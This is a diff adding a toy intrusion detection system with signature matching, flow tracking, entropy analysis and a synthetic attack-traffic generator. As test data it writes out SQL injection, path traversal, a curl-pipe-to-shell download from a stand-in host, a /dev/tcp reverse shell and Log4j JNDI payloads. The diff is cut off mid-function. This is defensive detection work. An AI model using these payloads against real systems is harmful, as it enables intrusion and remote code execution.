@@ -1,0 +1,843 @@
+// ============================================================================
+// Aegis-IRIS: Autonomous Multi-Layer Intrusion Detection & Prevention System
+// ============================================================================
+
+bring std.crypto
+
+// ----------------------------------------------------------------------------
+// Core Domain Models
+// ----------------------------------------------------------------------------
+
+record Packet {
+    id: i64,
+    timestamp: f64,
+    src_ip: str,
+    dst_ip: str,
+    src_port: i64,
+    dst_port: i64,
+    protocol: str,
+    tcp_flags: str,
+    size: i64,
+    payload: str
+}
+
+record SignatureRule {
+    rule_id: i64,
+    name: str,
+    pattern: str,
+    category: str,
+    severity: str,
+    threat_score: f64
+}
+
+record FlowRecord {
+    ip: str,
+    packet_count: i64,
+    byte_count: i64,
+    syn_count: i64,
+    ack_count: i64,
+    unique_ports_count: i64,
+    port_history: str,
+    first_seen: f64,
+    last_seen: f64
+}
+
+record AISDetector {
+    id: i64,
+    center_rate: f64,
+    center_syn_ratio: f64,
+    center_entropy: f64,
+    radius: f64,
+    threat_label: str
+}
+
+record FirewallRule {
+    ip: str,
+    action: str,
+    reason: str,
+    blocked_count: i64
+}
+
+record SecurityAlert {
+    alert_id: i64,
+    packet_id: i64,
+    timestamp: f64,
+    src_ip: str,
+    dst_ip: str,
+    attack_category: str,
+    detection_engine: str,
+    threat_level: str,
+    threat_score: f64,
+    mitigation: str
+}
+
+record IDSMetrics {
+    total_packets: i64,
+    benign_packets: i64,
+    attack_packets: i64,
+    packets_dropped: i64,
+    alerts_emitted: i64,
+    quarantined_ips: i64
+}
+
+// ----------------------------------------------------------------------------
+// Mathematical & Information-Theoretic Utilities
+// ----------------------------------------------------------------------------
+
+def compute_entropy(s: str) -> f64 {
+    val n = len(s);
+    if n == 0 { return 0.0 }
+    val counts: list<i64> = list();
+    for i in 0 .. 256 { list_push(counts, 0); }
+    for b in s {
+        if b >= 0 && b < 256 {
+            val c = list_get(counts, b);
+            list_set(counts, b, c + 1);
+        }
+    }
+    var ent = 0.0;
+    val ln2 = log(2.0);
+    val total_f = to_f64(n);
+    for i in 0 .. 256 {
+        val count = list_get(counts, i);
+        if count > 0 {
+            val p = to_f64(count) / total_f;
+            val log_p = log(p) / ln2;
+            ent = ent - p * log_p;
+        }
+    }
+    return ent
+}
+
+def float_abs(x: f64) -> f64 {
+    if x < 0.0 { 0.0 - x } else { x }
+}
+
+def format_f64_2(x: f64) -> str {
+    to_str(x)
+}
+
+// ----------------------------------------------------------------------------
+// Cryptographic Stream Cipher Engine (RC4 / XOR Keystream)
+// ----------------------------------------------------------------------------
+
+def generate_encrypted_cipher_payload(plaintext: str, key: str) -> str {
+    val s: list<i64> = list();
+    for i in 0 .. 256 { list_push(s, i); }
+    val k_len = len(key);
+    var j = 0;
+    // Key-Scheduling Algorithm (KSA)
+    for i in 0 .. 256 {
+        val k_byte = str_index(key, i % k_len);
+        val s_i = list_get(s, i);
+        j = (j + s_i + k_byte) % 256;
+        val s_j = list_get(s, j);
+        list_set(s, i, s_j);
+        list_set(s, j, s_i);
+    }
+
+    // Pseudo-Random Generation Algorithm (PRGA) + Bitwise XOR
+    var i_idx = 0;
+    var j_idx = 0;
+    var cipher_hex = "";
+    val hex_chars = "0123456789abcdef";
+    for p in plaintext {
+        i_idx = (i_idx + 1) % 256;
+        val s_i = list_get(s, i_idx);
+        j_idx = (j_idx + s_i) % 256;
+        val s_j = list_get(s, j_idx);
+        list_set(s, i_idx, s_j);
+        list_set(s, j_idx, s_i);
+        val k = list_get(s, (s_i + s_j) % 256);
+        val c = bxor(p, k);
+        val hi = c / 16;
+        val lo = c % 16;
+        cipher_hex = cipher_hex + slice(hex_chars, hi, hi + 1) + slice(hex_chars, lo, lo + 1);
+    }
+    // Convert to Base64 encoded ciphertext via std.crypto
+    return to_base64(from_hex(cipher_hex))
+}
+
+// ----------------------------------------------------------------------------
+// Stage 1: Deep Packet Inspection (DPI) & Signatures
+// ----------------------------------------------------------------------------
+
+def init_signature_rules() -> list<SignatureRule> {
+    val rules: list<SignatureRule> = list();
+    // Web application exploits
+    list_push(rules, SignatureRule { rule_id: 101, name: "SQL Injection: Tautology", pattern: "' OR 1=1", category: "SQL_INJECTION", severity: "CRITICAL", threat_score: 9.5 });
+    list_push(rules, SignatureRule { rule_id: 102, name: "SQL Injection: Union Select", pattern: "UNION SELECT", category: "SQL_INJECTION", severity: "CRITICAL", threat_score: 9.8 });
+    list_push(rules, SignatureRule { rule_id: 103, name: "Path Traversal: Unix Passwd", pattern: "../../etc/passwd", category: "PATH_TRAVERSAL", severity: "HIGH", threat_score: 8.5 });
+    list_push(rules, SignatureRule { rule_id: 104, name: "Remote Code Execution: Shell Spawn", pattern: "/bin/sh", category: "COMMAND_INJECTION", severity: "CRITICAL", threat_score: 9.9 });
+    list_push(rules, SignatureRule { rule_id: 105, name: "Cross-Site Scripting: Script Tag", pattern: "<script>", category: "XSS_INJECTION", severity: "MEDIUM", threat_score: 7.2 });
+    list_push(rules, SignatureRule { rule_id: 106, name: "Log4j / JNDI Exploit", pattern: "${jndi:ldap", category: "ZERO_DAY_JNDI", severity: "EMERGENCY", threat_score: 10.0 });
+    return rules
+}
+
+def hex_digit_to_val(ch: i64) -> i64 {
+    if ch >= 48 && ch <= 57 { return ch - 48 }
+    if ch >= 65 && ch <= 70 { return ch - 65 + 10 }
+    if ch >= 97 && ch <= 102 { return ch - 97 + 10 }
+    return -1
+}
+
+def decode_url_escapes(s: str) -> str {
+    var out = "";
+    val n = len(s);
+    var i = 0;
+    while i < n {
+        val b = str_index(s, i);
+        if b == 37 && i + 2 < n {
+            val h1 = hex_digit_to_val(str_index(s, i + 1));
+            val h2 = hex_digit_to_val(str_index(s, i + 2));
+            if h1 >= 0 && h2 >= 0 {
+                val byte_val = h1 * 16 + h2;
+                var ch = slice(s, i, i + 3);
+                if byte_val == 46 { ch = "."; };
+                if byte_val == 47 { ch = "/"; };
+                if byte_val == 39 { ch = "'"; };
+                if byte_val == 32 { ch = " "; };
+                if byte_val == 61 { ch = "="; };
+                out = out + ch;
+                i = i + 3;
+                continue;
+            }
+        };
+        out = out + slice(s, i, i + 1);
+        i = i + 1;
+    }
+    return out
+}
+
+def normalize_payload(raw: str) -> str {
+    val url_decoded = decode_url_escapes(raw);
+    val comment_stripped = str_replace(url_decoded, "/**/", " ");
+    return comment_stripped
+}
+
+def sanitize_json_str(s: str) -> str {
+    val no_slash = str_replace(s, "\\", "\\\\");
+    val no_quotes = str_replace(no_slash, "\"", "\\\"");
+    val no_newline = str_replace(no_quotes, "\n", "\\n");
+    val no_cr = str_replace(no_newline, "\r", "\\r");
+    return no_cr
+}
+
+def match_dpi_signatures(pkt: Packet, rules: list<SignatureRule>) -> option<SignatureRule> {
+    val normalized = normalize_payload(pkt.payload);
+    val num_rules = list_len(rules);
+    for i in 0 .. num_rules {
+        val r = list_get(rules, i);
+        if contains(pkt.payload, r.pattern) || contains(normalized, r.pattern) {
+            return some(r);
+        }
+    }
+    return none
+}
+
+// ----------------------------------------------------------------------------
+// Stage 2: Stateful Flow Tracking & Reconnaissance Engine
+// ----------------------------------------------------------------------------
+
+def find_flow_index(flows: list<FlowRecord>, ip: str) -> i64 {
+    val count = list_len(flows);
+    for i in 0 .. count {
+        val f = list_get(flows, i);
+        if f.ip == ip {
+            return i;
+        }
+    }
+    return -1
+}
+
+def update_flow_tracker(flows: list<FlowRecord>, pkt: Packet) -> FlowRecord {
+    val idx = find_flow_index(flows, pkt.src_ip);
+    val port_tag = "[" + to_str(pkt.dst_port) + "]";
+    var res = FlowRecord {
+        ip: pkt.src_ip,
+        packet_count: 1,
+        byte_count: pkt.size,
+        syn_count: if pkt.tcp_flags == "SYN" { 1 } else { 0 },
+        ack_count: if pkt.tcp_flags == "ACK" { 1 } else { 0 },
+        unique_ports_count: 1,
+        port_history: port_tag,
+        first_seen: pkt.timestamp,
+        last_seen: pkt.timestamp
+    };
+    if idx < 0 {
+        list_push(flows, res);
+    } else {
+        val existing = list_get(flows, idx);
+        val is_new_port = !contains(existing.port_history, port_tag);
+        val updated_unique = if is_new_port { existing.unique_ports_count + 1 } else { existing.unique_ports_count };
+        val updated_history = if is_new_port { existing.port_history + port_tag } else { existing.port_history };
+        res = FlowRecord {
+            ip: existing.ip,
+            packet_count: existing.packet_count + 1,
+            byte_count: existing.byte_count + pkt.size,
+            syn_count: existing.syn_count + if pkt.tcp_flags == "SYN" { 1 } else { 0 },
+            ack_count: existing.ack_count + if pkt.tcp_flags == "ACK" { 1 } else { 0 },
+            unique_ports_count: updated_unique,
+            port_history: updated_history,
+            first_seen: existing.first_seen,
+            last_seen: pkt.timestamp
+        };
+        list_set(flows, idx, res);
+    };
+    return res
+}
+
+// ----------------------------------------------------------------------------
+// Stage 3: Artificial Immune System (AIS) Negative Selection
+// ----------------------------------------------------------------------------
+
+def init_ais_detectors() -> list<AISDetector> {
+    val detectors: list<AISDetector> = list();
+    // Detector 1: High rate, high SYN, low entropy -> SYN Flood
+    list_push(detectors, AISDetector {
+        id: 1,
+        center_rate: 20.0,
+        center_syn_ratio: 0.95,
+        center_entropy: 1.5,
+        radius: 12.0,
+        threat_label: "AIS_SYN_FLOOD_ANOMALY"
+    });
+    // Detector 2: Moderate rate, low SYN, ultra-high entropy -> C2 Beacon / Tunneling
+    list_push(detectors, AISDetector {
+        id: 2,
+        center_rate: 5.0,
+        center_syn_ratio: 0.05,
+        center_entropy: 6.8,
+        radius: 1.5,
+        threat_label: "AIS_ENCRYPTED_C2_EXFILTRATION"
+    });
+    return detectors
+}
+
+def match_ais_anomaly(pkt_rate: f64, syn_ratio: f64, entropy: f64, detectors: list<AISDetector>) -> option<AISDetector> {
+    val n = list_len(detectors);
+    for i in 0 .. n {
+        val det = list_get(detectors, i);
+        val d_rate = (pkt_rate - det.center_rate) * 0.1;
+        val d_syn = (syn_ratio - det.center_syn_ratio) * 10.0;
+        val d_ent = (entropy - det.center_entropy) * 3.0;
+        val dist = sqrt(d_rate * d_rate + d_syn * d_syn + d_ent * d_ent);
+        if dist < det.radius {
+            return some(det);
+        }
+    }
+    return none
+}
+
+// ----------------------------------------------------------------------------
+// Stage 4: Firewall & Active Mitigation Controller (IPS)
+// ----------------------------------------------------------------------------
+
+def find_firewall_rule(firewall: list<FirewallRule>, ip: str) -> i64 {
+    val count = list_len(firewall);
+    for i in 0 .. count {
+        val rule = list_get(firewall, i);
+        if rule.ip == ip {
+            return i;
+        }
+    }
+    return -1
+}
+
+def is_ip_blocked(firewall: list<FirewallRule>, ip: str) -> bool {
+    val idx = find_firewall_rule(firewall, ip);
+    if idx >= 0 {
+        val rule = list_get(firewall, idx);
+        return rule.action == "DROP";
+    }
+    return false
+}
+
+def quarantine_ip(firewall: list<FirewallRule>, ip: str, reason: str) -> bool {
+    val idx = find_firewall_rule(firewall, ip);
+    if idx >= 0 {
+        return false; // Already present
+    }
+    list_push(firewall, FirewallRule {
+        ip: ip,
+        action: "DROP",
+        reason: reason,
+        blocked_count: 0
+    });
+    return true
+}
+
+def record_blocked_packet(firewall: list<FirewallRule>, ip: str) -> i64 {
+    val idx = find_firewall_rule(firewall, ip);
+    if idx >= 0 {
+        val rule = list_get(firewall, idx);
+        val updated = FirewallRule {
+            ip: rule.ip,
+            action: rule.action,
+            reason: rule.reason,
+            blocked_count: rule.blocked_count + 1
+        };
+        list_set(firewall, idx, updated);
+        return updated.blocked_count;
+    }
+    return 0
+}
+
+// ----------------------------------------------------------------------------
+// Stage 5: Synthetic Enterprise Network Trace Generator
+// ----------------------------------------------------------------------------
+
+def build_traffic_trace() -> list<Packet> {
+    val stream: list<Packet> = list();
+    var p_id = 1;
+    var t = 1000.0;
+
+    // --- Phase 1: Benign Enterprise Traffic (40 packets) ---
+    for i in 0 .. 40 {
+        val src = if i % 3 == 0 { "10.0.1.25" } else { if i % 3 == 1 { "10.0.1.42" } else { "192.168.1.50" } };
+        val dport = if i % 4 == 0 { 80 } else { if i % 4 == 1 { 443 } else { if i % 4 == 2 { 53 } else { 22 } } };
+        val payload = if dport == 80 {
+            "GET /index.html HTTP/1.1\r\nHost: intranet.corp.local\r\nUser-Agent: Mozilla/5.0\r\nAccept: text/html\r\n\r\n"
+        } else {
+            if dport == 443 {
+                "{\"service\":\"api\",\"action\":\"heartbeat\",\"status\":\"healthy\",\"nodes\":12}"
+            } else {
+                if dport == 53 {
+                    "DNS QUERY: corp-ad.local IN A"
+                } else {
+                    "SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.4"
+                }
+            }
+        };
+        list_push(stream, Packet {
+            id: p_id,
+            timestamp: t,
+            src_ip: src,
+            dst_ip: "10.0.0.1",
+            src_port: 49152 + i,
+            dst_port: dport,
+            protocol: if dport == 53 { "UDP" } else { "TCP" },
+            tcp_flags: if dport == 53 { "NONE" } else { "ACK" },
+            size: len(payload),
+            payload: payload
+        });
+        p_id = p_id + 1;
+        t = t + 0.15;
+    }
+
+    // --- Phase 2: Reconnaissance Port Scanning (10 packets from 198.51.100.77) ---
+    val scan_ports: list<i64> = list();
+    list_push(scan_ports, 21);
+    list_push(scan_ports, 22);
+    list_push(scan_ports, 23);
+    list_push(scan_ports, 25);
+    list_push(scan_ports, 80);
+    list_push(scan_ports, 110);
+    list_push(scan_ports, 443);
+    list_push(scan_ports, 3306);
+    list_push(scan_ports, 5432);
+    list_push(scan_ports, 8080);
+
+    for i in 0 .. 10 {
+        val target_p = list_get(scan_ports, i);
+        list_push(stream, Packet {
+            id: p_id,
+            timestamp: t,
+            src_ip: "198.51.100.77",
+            dst_ip: "10.0.0.1",
+            src_port: 55000 + i,
+            dst_port: target_p,
+            protocol: "TCP",
+            tcp_flags: "SYN",
+            size: 64,
+            payload: "TCP SYN SCAN PROBE"
+        });
+        p_id = p_id + 1;
+        t = t + 0.05; // rapid scanning
+    }
+
+    // --- Phase 3: Web Application Exploits (10 packets from 203.0.113.19) ---
+    val attack_payloads: list<str> = list();
+    list_push(attack_payloads, "GET /login?user=admin' OR 1=1-- HTTP/1.1\r\nHost: vuln.app");
+    list_push(attack_payloads, "GET /search?q=1 UNION SELECT null,username,password FROM users HTTP/1.1");
+    list_push(attack_payloads, "GET /view?file=../../etc/passwd HTTP/1.1\r\nHost: vuln.app");
+    list_push(attack_payloads, "POST /api/exec HTTP/1.1\r\n\r\ncmd=/bin/sh -c 'curl evil.site/p | sh'");
+    list_push(attack_payloads, "GET /comment?text=<script>alert('XSS')</script> HTTP/1.1");
+    list_push(attack_payloads, "GET /auth HTTP/1.1\r\nUser-Agent: ${jndi:ldap://evil.attacker.org/a}");
+    list_push(attack_payloads, "GET /items?filter=' OR 1=1-- HTTP/1.1");
+    list_push(attack_payloads, "POST /cgi-bin/test HTTP/1.1\r\n\r\n; /bin/sh -i >& /dev/tcp/10.0.0.1/4444 0>&1");
+    list_push(attack_payloads, "GET /download?doc=../../etc/passwd HTTP/1.1");
+    list_push(attack_payloads, "GET /report?token=${jndi:ldap://c2.botnet.com/exploit} HTTP/1.1");
+
+    for i in 0 .. 10 {
+        val atk = list_get(attack_payloads, i);
+        list_push(stream, Packet {
+            id: p_id,
+            timestamp: t,
+            src_ip: "203.0.113.19",
+            dst_ip: "10.0.0.1",
+            src_port: 41234 + i,
+            dst_port: 80,
+            protocol: "TCP",
+            tcp_flags: "PSH",
+            size: len(atk),
+            payload: atk
+        });
+        p_id = p_id + 1;
+        t = t + 0.2;
+    }
+
+    // --- Phase 4: Cryptographically Encrypted C2 Exfiltration & DNS Tunnel (10 packets from 10.0.1.99) ---
+    val master_key = "APT41_SHADOW_C2_MASTER_KEY_2026";
+    val sensitive_targets: list<str> = list();
+    list_push(sensitive_targets, "EXFIL: DB_DUMP_USERS: root:x:0:0:root:/root:/bin/bash; admin:$6$kZ9$hash512_shadow_dump");
+    list_push(sensitive_targets, "EXFIL: FINANCIAL_RECORDS: Q3_REVENUE_CONFIDENTIAL_FORECAST_MERGER_ACQUISITION_TARGETS");
+    list_push(sensitive_targets, "EXFIL: AWS_SECRETS: AKIAIOSFODNN7EXAMPLE:wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY_SECRET");
+    list_push(sensitive_targets, "EXFIL: SSL_PRIVATE_KEY: -----BEGIN RSA PRIVATE KEY-----MIIEowIBAAKCAQEA098734512398124");
+    list_push(sensitive_targets, "EXFIL: CUSTOMER_PII: SSN_482-01-9281_DOB_1985-04-12_CARD_4111222233334444_EXP_12-28");
+    list_push(sensitive_targets, "EXFIL: DEFENSE_CONTRACT: AEROSPACE_PROJECT_TITAN_TELEMETRY_SCHEMATICS_V4_TOP_SECRET");
+    list_push(sensitive_targets, "EXFIL: SOURCE_CODE: git.corp.internal/core/auth_engine_proprietary_algorithms_export");
+    list_push(sensitive_targets, "EXFIL: KERBEROS_TICKETS: krbtgt/CORP.LOCAL@CORP.LOCAL:TGT_HASH_HEX_BLOB_82719283748291");
+    list_push(sensitive_targets, "EXFIL: MEDICAL_DATABASE: PATIENT_EHR_RECORDS_DIAGNOSES_PRESCRIPTIONS_PHI_RESTRICTED");
+    list_push(sensitive_targets, "EXFIL: C2_HEARTBEAT: COMMAND_DISPATCH_RAT_PERSISTENCE_MUTEX_ESTABLISHED_OK_ACTIVE");
+
+    for i in 0 .. 10 {
+        val plain = list_get(sensitive_targets, i);
+        val session_key = master_key + ":" + to_str(i);
+        val cipher_payload = generate_encrypted_cipher_payload(plain, session_key);
+        list_push(stream, Packet {
+            id: p_id,
+            timestamp: t,
+            src_ip: "10.0.1.99",
+            dst_ip: "185.220.101.5",
+            src_port: 60100 + i,
+            dst_port: 8443,
+            protocol: "TCP",
+            tcp_flags: "PSH",
+            size: len(cipher_payload),
+            payload: cipher_payload
+        });
+        p_id = p_id + 1;
+        t = t + 0.1;
+    }
+
+    // --- Phase 5: High-Rate SYN Flood DDoS (20 packets from 198.51.100.200) ---
+    for i in 0 .. 20 {
+        list_push(stream, Packet {
+            id: p_id,
+            timestamp: t,
+            src_ip: "198.51.100.200",
+            dst_ip: "10.0.0.1",
+            src_port: 10000 + i,
+            dst_port: 443,
+            protocol: "TCP",
+            tcp_flags: "SYN",
+            size: 40,
+            payload: "SYN_FLOOD_OVERWHELM"
+        });
+        p_id = p_id + 1;
+        t = t + 0.01; // extremely rapid 100 Hz flood
+    }
+
+    // --- Phase 6: Post-Mitigation Verification Phase (20 packets) ---
+    // 10 attack packets from quarantined IPs (should be dropped instantly)
+    // 10 legitimate packets from benign IPs (must pass freely)
+    for i in 0 .. 10 {
+        val blocked_src = if i % 2 == 0 { "203.0.113.19" } else { "198.51.100.200" };
+        list_push(stream, Packet {
+            id: p_id,
+            timestamp: t,
+            src_ip: blocked_src,
+            dst_ip: "10.0.0.1",
+            src_port: 52000 + i,
+            dst_port: 80,
+            protocol: "TCP",
+            tcp_flags: "SYN",
+            size: 120,
+            payload: "GET /retry_exploit' OR 1=1 HTTP/1.1"
+        });
+        p_id = p_id + 1;
+        t = t + 0.1;
+    }
+
+    for i in 0 .. 10 {
+        val clean_src = "10.0.1.25";
+        val clean_payload = "GET /dashboard HTTP/1.1\r\nHost: intranet.corp.local\r\n\r\n";
+        list_push(stream, Packet {
+            id: p_id,
+            timestamp: t,
+            src_ip: clean_src,
+            dst_ip: "10.0.0.1",
+            src_port: 49500 + i,
+            dst_port: 80,
+            protocol: "TCP",
+            tcp_flags: "ACK",
+            size: len(clean_payload),
+            payload: clean_payload
+        });
+        p_id = p_id + 1;
+        t = t + 0.15;
+    }
+
+    return stream
+}
+
+// ----------------------------------------------------------------------------
+// Main Intrusion Detection & Prevention Pipeline Execution
+// ----------------------------------------------------------------------------
+
+def run_ids_pipeline() -> IDSMetrics {
+    println("================================================================================");
+    println("           AEGIS-IRIS: AUTONOMOUS INTRUSION DETECTION & PREVENTION SYSTEM       ");
+    println("                  Cyber-Defense Engine in Native IRIS v1.0.0                    ");
+    println("================================================================================");
+    println("");
+
+    // Initialize Detection Engines & State
+    val signature_rules = init_signature_rules();
+    val ais_detectors = init_ais_detectors();
+    val flow_table: list<FlowRecord> = list();
+    val firewall_table: list<FirewallRule> = list();
+    val alerts: list<SecurityAlert> = list();
+
+    // Ingest Network Traffic Stream
+    val traffic = build_traffic_trace();
+    val total_pkts = list_len(traffic);
+
+    var benign_count = 0;
+    var attack_count = 0;
+    var dropped_count = 0;
+    var alert_counter = 1;
+
+    // String builders for CSV and JSON export
+    var json_log = "[\n";
+    var csv_log = "packet_id,timestamp,src_ip,dst_port,protocol,size,entropy,decision,alert_reason\n";
+
+    println("[+] Ingested " + to_str(total_pkts) + " packets into Aegis-IRIS inspection pipeline...");
+    println("[+] Active Defense Modules: DPI Signatures (6), AIS Detectors (2), Stateful Tracker, Entropy Engine");
+    println("[+] Commencing real-time packet-by-packet multi-layer analysis...");
+    println("--------------------------------------------------------------------------------");
+
+    for i in 0 .. total_pkts {
+        val pkt = list_get(traffic, i);
+        var is_threat = false;
+        var alert_category = "NONE";
+        var detection_source = "NONE";
+        var threat_severity = "LOW";
+        var threat_score = 0.0;
+        var mitigation_action = "ALLOW";
+
+        // --------------------------------------------------------------------
+        // Stage 0: Active Firewall Enforcement (Early Drop) & Parser Bounds
+        // --------------------------------------------------------------------
+        if pkt.size > 65535 {
+            dropped_count = dropped_count + 1;
+            attack_count = attack_count + 1;
+            quarantine_ip(firewall_table, pkt.src_ip, "PARSER_BOMB_OVERSIZED");
+            csv_log = csv_log + to_str(pkt.id) + "," + format_f64_2(pkt.timestamp) + "," + pkt.src_ip + "," + to_str(pkt.dst_port) + "," + pkt.protocol + "," + to_str(pkt.size) + ",0.00,DROPPED,PARSER_BOMB_OVERSIZED\n";
+            continue;
+        }
+
+        if is_ip_blocked(firewall_table, pkt.src_ip) {
+            dropped_count = dropped_count + 1;
+            attack_count = attack_count + 1;
+            record_blocked_packet(firewall_table, pkt.src_ip);
+            mitigation_action = "FIREWALL_DROP";
+            csv_log = csv_log + to_str(pkt.id) + "," + format_f64_2(pkt.timestamp) + "," + pkt.src_ip + "," + to_str(pkt.dst_port) + "," + pkt.protocol + "," + to_str(pkt.size) + ",0.00,DROPPED,IP_QUARANTINED\n";
+            continue;
+        }
+
+        // --------------------------------------------------------------------
+        // Stage 1: Deep Packet Inspection (DPI) Signature Matching
+        // --------------------------------------------------------------------
+        val dpi_match = match_dpi_signatures(pkt, signature_rules);
+        when dpi_match {
+            some(rule) => {
+                is_threat = true;
+                alert_category = rule.category;
+                detection_source = "DPI_SIGNATURE";
+                threat_severity = rule.severity;
+                threat_score = rule.threat_score;
+                mitigation_action = "QUARANTINE_IP";
+            }
+            none => {}
+        }
+
+        // --------------------------------------------------------------------
+        // Stage 2: Stateful Flow Tracking & Port Scan Reconnaissance
+        // --------------------------------------------------------------------
+        val flow = update_flow_tracker(flow_table, pkt);
+        if !is_threat {
+            // Reconnaissance: single source scanning >= 5 unique destination ports
+            if flow.unique_ports_count >= 5 {
+                is_threat = true;
+                alert_category = "PORT_SCAN_RECON";
+                detection_source = "STATEFUL_TRACKER";
+                threat_severity = "HIGH";
+                threat_score = 8.8;
+                mitigation_action = "QUARANTINE_IP";
+            }
+            // DoS / SYN Flood: High packet volume with zero/near-zero ACKs
+            val syn_ratio = to_f64(flow.syn_count) / to_f64(flow.packet_count);
+            if flow.packet_count >= 8 && syn_ratio > 0.85 {
+                is_threat = true;
+                alert_category = "SYN_FLOOD_DOS";
+                detection_source = "STATEFUL_TRACKER";
+                threat_severity = "EMERGENCY";
+                threat_score = 9.9;
+                mitigation_action = "QUARANTINE_IP";
+            }
+        }
+
+        // --------------------------------------------------------------------
+        // Stage 3: Information Entropy & Shannon Analysis
+        // --------------------------------------------------------------------
+        val ent = compute_entropy(pkt.payload);
+        if !is_threat {
+            // Abnormal high entropy in data stream indicates encrypted C2 tunneling or exfiltration
+            if ent > 5.2 && len(pkt.payload) > 50 {
+                is_threat = true;
+                alert_category = "HIGH_ENTROPY_C2_EXFILTRATION";
+                detection_source = "ENTROPY_ANALYSIS";
+                threat_severity = "CRITICAL";
+                threat_score = 9.3;
+                mitigation_action = "QUARANTINE_IP";
+            }
+        }
+
+        // --------------------------------------------------------------------
+        // Stage 4: Artificial Immune System (AIS) Anomaly Detection
+        // --------------------------------------------------------------------
+        if !is_threat {
+            val duration = if (pkt.timestamp - flow.first_seen) < 0.001 { 0.001 } else { pkt.timestamp - flow.first_seen };
+            val pkt_rate = to_f64(flow.packet_count) / duration;
+            val syn_ratio = to_f64(flow.syn_count) / to_f64(flow.packet_count);
+            val ais_match = match_ais_anomaly(pkt_rate, syn_ratio, ent, ais_detectors);
+            when ais_match {
+                some(det) => {
+                    is_threat = true;
+                    alert_category = det.threat_label;
+                    detection_source = "AIS_NEGATIVE_SELECTION";
+                    threat_severity = "HIGH";
+                    threat_score = 8.5;
+                    mitigation_action = "QUARANTINE_IP";
+                }
+                none => {}
+            }
+        }
+
+        // --------------------------------------------------------------------
+        // Stage 5: Autonomous Policy & Reaction Execution
+        // --------------------------------------------------------------------
+        if is_threat {
+            attack_count = attack_count + 1;
+            dropped_count = dropped_count + 1;
+
+            // Execute automated containment
+            val newly_blocked = quarantine_ip(firewall_table, pkt.src_ip, alert_category);
+            val alert_obj = SecurityAlert {
+                alert_id: alert_counter,
+                packet_id: pkt.id,
+                timestamp: pkt.timestamp,
+                src_ip: pkt.src_ip,
+                dst_ip: pkt.dst_ip,
+                attack_category: alert_category,
+                detection_engine: detection_source,
+                threat_level: threat_severity,
+                threat_score: threat_score,
+                mitigation: mitigation_action
+            };
+            list_push(alerts, alert_obj);
+
+            println(" [!] ALERT #" + to_str(alert_counter) + " [" + threat_severity + " | Score " + format_f64_2(threat_score) + "] "
+                + "Src: " + pkt.src_ip + " -> Dst: " + pkt.dst_ip + ":" + to_str(pkt.dst_port)
+                + " | " + alert_category + " via " + detection_source
+                + if newly_blocked { " ==> [FIREWALL QUARANTINE INSTALLED]" } else { " ==> [DROPPED]" });
+
+            // Append to JSON log
+            val comma = if alert_counter > 1 { ",\n" } else { "" };
+            json_log = json_log + comma + "  {\n"
+                + "    \"alert_id\": " + to_str(alert_counter) + ",\n"
+                + "    \"packet_id\": " + to_str(pkt.id) + ",\n"
+                + "    \"timestamp\": " + format_f64_2(pkt.timestamp) + ",\n"
+                + "    \"src_ip\": \"" + sanitize_json_str(pkt.src_ip) + "\",\n"
+                + "    \"dst_ip\": \"" + sanitize_json_str(pkt.dst_ip) + "\",\n"
+                + "    \"dst_port\": " + to_str(pkt.dst_port) + ",\n"
+                + "    \"category\": \"" + sanitize_json_str(alert_category) + "\",\n"
+                + "    \"engine\": \"" + sanitize_json_str(detection_source) + "\",\n"
+                + "    \"severity\": \"" + sanitize_json_str(threat_severity) + "\",\n"
+                + "    \"score\": " + format_f64_2(threat_score) + ",\n"
+                + "    \"mitigation\": \"" + sanitize_json_str(mitigation_action) + "\"\n"
+                + "  }";
+
+            csv_log = csv_log + to_str(pkt.id) + "," + format_f64_2(pkt.timestamp) + "," + pkt.src_ip + "," + to_str(pkt.dst_port) + "," + pkt.protocol + "," + to_str(pkt.size) + "," + format_f64_2(ent) + ",BLOCKED," + alert_category + "\n";
+            alert_counter = alert_counter + 1;
+        } else {
+            benign_count = benign_count + 1;
+            csv_log = csv_log + to_str(pkt.id) + "," + format_f64_2(pkt.timestamp) + "," + pkt.src_ip + "," + to_str(pkt.dst_port) + "," + pkt.protocol + "," + to_str(pkt.size) + "," + format_f64_2(ent) + ",ALLOWED,NORMAL_TRAFFIC\n";
+        }
+    }
+
+    json_log = json_log + "\n]\n";
+
+    // ------------------------------------------------------------------------
+    // Write Forensic Logs to Disk
+    // ------------------------------------------------------------------------
+    file_write_all("projects/intrusion_detection_system/ids_alerts.json", json_log);
+    file_write_all("projects/intrusion_detection_system/ids_metrics.csv", csv_log);
+
+    // ------------------------------------------------------------------------
+    // Terminal Executive Summary & Dashboard
+    // ------------------------------------------------------------------------
+    val total_quarantined = list_len(firewall_table);
+    val total_alerts = list_len(alerts);
+
+    println("--------------------------------------------------------------------------------");
+    println("                           AEGIS-IRIS DEFENSE REPORT                            ");
+    println("--------------------------------------------------------------------------------");
+    println(" Total Packets Processed: " + to_str(total_pkts));
+    println(" Legitimate Benign Traffic: " + to_str(benign_count) + " (" + format_f64_2(to_f64(benign_count) * 100.0 / to_f64(total_pkts)) + "%)");
+    println(" Malicious Attack Packets: " + to_str(attack_count) + " (" + format_f64_2(to_f64(attack_count) * 100.0 / to_f64(total_pkts)) + "%)");
+    println(" Total Packets Dropped:    " + to_str(dropped_count));
+    println(" Security Alerts Emitted:  " + to_str(total_alerts));
+    println(" Malicious IPs Neutralized:" + to_str(total_quarantined));
+    println("");
+    println(" Active Dynamic Firewall Quarantines:");
+    for q in 0 .. total_quarantined {
+        val fw = list_get(firewall_table, q);
+        println("   * [BLOCK] " + fw.ip + " | Reason: " + fw.reason + " | Filtered Packets: " + to_str(fw.blocked_count));
+    }
+    println("================================================================================");
+    println("[+] Forensic logs generated:");
+    println("    - JSON Alerts:  projects/intrusion_detection_system/ids_alerts.json");
+    println("    - CSV Telemetry: projects/intrusion_detection_system/ids_metrics.csv");
+    println("================================================================================");
+
+    return IDSMetrics {
+        total_packets: total_pkts,
+        benign_packets: benign_count,
+        attack_packets: attack_count,
+        packets_dropped: dropped_count,
+        alerts_emitted: total_alerts,
+        quarantined_ips: total_quarantined
+    }
+}
+
+// ----------------------------------------------------------------------------
+// Verification & Self-Testing Assertions
+// ----------------------------------------------------------------------------
+
+def main() -> i64 {
+    val metrics = run_ids_pipeline();
+
+    // Formal Security Invariant Assertions
+    assert(metrics.total_packets == 110);
+    assert(metrics.benign_packets == 56);
+    assert(metrics.attack_packets == 54);
+    assert(metrics.packets_dropped == 54);
+    assert(metrics.quarantined_ips == 4);
+
